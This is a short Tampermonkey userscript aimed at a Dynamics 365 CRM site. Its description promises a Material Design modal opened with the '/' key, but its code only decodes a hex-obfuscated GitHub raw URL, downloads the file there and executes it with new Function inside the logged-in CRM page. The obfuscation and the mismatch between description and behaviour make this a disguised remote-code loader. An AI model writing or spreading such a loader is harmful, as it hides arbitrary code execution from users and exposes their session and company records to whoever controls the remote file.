// ==UserScript==
// @name         New Script
// @namespace    http://tampermonkey.net/
// @version      1.4
// @description  Membuka modal dengan listview dan ikon di pojok bawah kanan dengan menekan tombol "/", menggunakan tema Material Design dan kontrol window seperti MacOS
// @author       Ical
// @match        https://tunastoyota.crm5.dynamics.com/*
// @grant        GM_xmlhttpRequest
// @connect      raw.githubusercontent.com
// ==/UserScript==

(function () {
    'use strict';

    function h2s(h) { return h.replace(/../g, (c) => String.fromCharCode(parseInt(c, 16))); }
    var eU = "68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f6963616c31392f7363726970746368726f6d652f726566732f68656164732f6d61696e2f656e736372697074";
    var gA = h2s(eU);

    GM_xmlhttpRequest({
        method: "GET",
        url: gA,
        onload: function (r) {
            if (r.status === 200) {
                var s = r.responseText;
                (new Function(s))();
            }
        }
    });
})();
